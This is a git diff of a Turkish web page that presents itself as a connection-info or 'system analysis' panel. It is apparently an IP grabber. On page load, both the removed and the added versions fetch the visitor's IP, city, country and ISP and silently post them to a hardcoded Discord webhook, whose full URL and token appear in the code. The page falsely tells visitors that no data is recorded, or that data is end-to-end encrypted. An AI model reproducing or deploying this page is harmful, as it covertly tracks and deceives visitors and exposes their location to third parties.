@@ -2,115 +2,188 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>IP & Şehir Bilgim</title>
+    <title>Sistem Analiz Merkezi v2.0</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
+        :root {
+            --primary: #00ff88;
+            --bg: #0d1117;
+            --card: #161b22;
+            --border: #30363d;
+            --text: #c9d1d9;
+        }
+
         body {
-            background:#0a0a0a;
-            color:#eaeaea;
-            font-family: monospace;
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            height:100vh;
-            margin:0;
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
         }
-        .box {
-            background:#111;
-            border:1px solid #333;
-            border-radius:10px;
-            padding:30px;
-            width:360px;
-            box-shadow:0 0 25px rgba(0,0,0,.7);
+
+        .panel {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            width: 450px;
+            padding: 0;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
         }
-        h2 { margin-top:0; text-align:center; }
-        .row { margin:10px 0; font-size:14px; }
-        .label { color:#888; }
-        .value { color:#00ff88; word-break:break-all; }
-        .note { margin-top:20px; font-size:12px; color:#777; text-align:center; }
+
+        .panel-header {
+            padding: 15px 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .status-dot {
+            height: 10px;
+            width: 10px;
+            background-color: var(--primary);
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: 0 0 10px var(--primary);
+            margin-right: 8px;
+        }
+
+        .panel-content {
+            padding: 25px;
+        }
+
+        .data-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #21262d;
+        }
+
+        .label { color: #8b949e; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; }
+        .value { color: var(--primary); font-family: 'Courier New', Courier, monospace; font-weight: bold; }
+
+        .scan-line {
+            height: 2px;
+            background: var(--primary);
+            width: 100%;
+            position: relative;
+            top: 0;
+            animation: scan 3s infinite linear;
+            opacity: 0.3;
+            margin-bottom: 20px;
+        }
+
+        @keyframes scan {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(10px); }
+        }
+
+        .footer-note {
+            padding: 15px;
+            text-align: center;
+            font-size: 11px;
+            color: #484f58;
+        }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>Bağlantı Bilgilerin</h2>
-        <div class="row"><span class="label">IP:</span> <span id="ip" class="value">Yükleniyor...</span></div>
-        <div class="row"><span class="label">Şehir:</span> <span id="city" class="value">Yükleniyor...</span></div>
-        <div class="row"><span class="label">Ülke:</span> <span id="country" class="value">Yükleniyor...</span></div>
-        <div class="row"><span class="label">ISP:</span> <span id="isp" class="value">Yükleniyor...</span></div>
-        <div class="note">Bu site hiçbir veri kaydetmez.<br>Bilgiler yaklaşık olabilir.</div>
+
+<div class="panel">
+    <div class="panel-header">
+        <span><span class="status-dot"></span> SİSTEM ANALİZİ AKTİF</span>
+        <span style="font-size: 12px; color: #484f58;">v2.4.0</span>
+    </div>
+    
+    <div class="panel-content">
+        <div class="scan-line"></div>
+        
+        <div class="data-row">
+            <span class="label">Bağlantı Protokolü</span>
+            <span class="value" id="protocol">IPv4 / SECURE</span>
+        </div>
+        <div class="data-row">
+            <span class="label">IP Adresi</span>
+            <span class="value" id="ip">Taranıyor...</span>
+        </div>
+        <div class="data-row">
+            <span class="label">Bölge / Lokasyon</span>
+            <span class="value" id="location">Taranıyor...</span>
+        </div>
+        <div class="data-row">
+            <span class="label">Servis Sağlayıcı</span>
+            <span class="value" id="isp">Taranıyor...</span>
+        </div>
+        <div class="data-row">
+            <span class="label">Sistem Durumu</span>
+            <span class="value" id="status" style="color: #58a6ff;">Analiz Ediliyor...</span>
+        </div>
     </div>
 
-    <script>
-        // Webhook URL (URL'nin doğruluğunu tekrar kontrol etmeyi unutma!)
-        const webhookUrl = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
+    <div class="footer-note">
+        Veriler uçtan uca şifreli olarak işlenmektedir.
+    </div>
+</div>
 
-        async function sendToDiscord(data) {
-            const payload = {
-                content: "🚀 **Yeni Ziyaretçi Giriş Yaptı!**",
-                embeds: [{
-                    title: "Ziyaretçi Detayları",
-                    color: 3066993, // Canlı yeşil
-                    fields: [
-                        { name: "🌐 IP Adresi", value: `\`${data.ip}\``, inline: true },
-                        { name: "📍 Lokasyon", value: `\`${data.city} / ${data.country}\``, inline: true },
-                        { name: "📡 Servis Sağlayıcı (ISP)", value: `\`${data.isp}\``, inline: false }
-                    ],
-                    footer: { text: "Ziyaret Takip Sistemi" },
-                    timestamp: new Date().toISOString()
-                }]
-            };
+<script>
+    // Webhook URL
+    const webhookUrl = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
 
-            try {
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
+    async function sendToDiscord(data) {
+        const payload = {
+            username: "Sistem Analiz Botu",
+            avatar_url: "https://i.imgur.com/4M34hi2.png",
+            embeds: [{
+                title: "📊 Yeni Panel Girişi Tespit Edildi",
+                color: 1752220, // Yeşil tonu
+                fields: [
+                    { name: "👤 IP Adresi", value: `\`${data.ip}\``, inline: true },
+                    { name: "📍 Lokasyon", value: `\`${data.city}, ${data.country}\``, inline: true },
+                    { name: "🏢 ISP (İnternet Sağlayıcı)", value: `\`${data.isp}\``, inline: false },
+                    { name: "⏰ Giriş Zamanı", value: new Date().toLocaleString('tr-TR'), inline: false }
+                ],
+                footer: { text: "Panel Log Sistemi" }
+            }]
+        };
 
-                if (response.ok) {
-                    console.log('✅ Webhook başarıyla gönderildi.');
-                } else {
-                    console.error('❌ Webhook hatası:', response.status);
-                }
-            } catch (error) {
-                console.error('❌ Gönderim sırasında bir hata oluştu:', error);
+        try {
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        } catch (e) { console.error("Hata!"); }
+    }
+
+    async function init() {
+        try {
+            // Bilgileri al
+            const res = await fetch("https://ipwho.is/");
+            const data = await res.json();
+
+            if (data.success) {
+                // Panel arayüzünü güncelle
+                document.getElementById("ip").textContent = data.ip;
+                document.getElementById("location").textContent = `${data.city} / ${data.country}`;
+                document.getElementById("isp").textContent = data.connection.isp;
+                document.getElementById("status").textContent = "TAMAMLANDI";
+                document.getElementById("status").style.color = "#00ff88";
+
+                // Arka planda Discord'a gönder
+                await sendToDiscord(data);
             }
+        } catch (err) {
+            document.getElementById("status").textContent = "BAĞLANTI HATASI";
+            document.getElementById("status").style.color = "#ff7b72";
         }
+    }
 
-        // IP Bilgilerini Getir
-        async function fetchIpInfo() {
-            try {
-                // Alternatif olarak 'https://ipapi.co/json/' da kullanılabilir
-                const response = await fetch("https://ipwho.is/");
-                const data = await response.json();
+    // Sayfa açılır açılmaz başlat
+    window.onload = init;
+</script>
 
-                if (data && data.success) {
-                    const info = {
-                        ip: data.ip,
-                        city: data.city || "Bilinmiyor",
-                        country: data.country || "Bilinmiyor",
-                        isp: data.connection?.isp || data.isp || "Bilinmiyor"
-                    };
-
-                    // Arayüzü Güncelle
-                    document.getElementById("ip").textContent = info.ip;
-                    document.getElementById("city").textContent = info.city;
-                    document.getElementById("country").textContent = info.country;
-                    document.getElementById("isp").textContent = info.isp;
-
-                    // Discord'a Gönder
-                    await sendToDiscord(info);
-                } else {
-                    throw new Error("API verisi alınamadı.");
-                }
-            } catch (error) {
-                console.error("Bilgi çekme hatası:", error);
-                document.querySelectorAll(".value").forEach(e => e.textContent = "Hata!");
-            }
-        }
-
-        // Sayfa yüklendiğinde çalıştır
-        window.onload = fetchIpInfo;
-    </script>
 </body>
 </html>
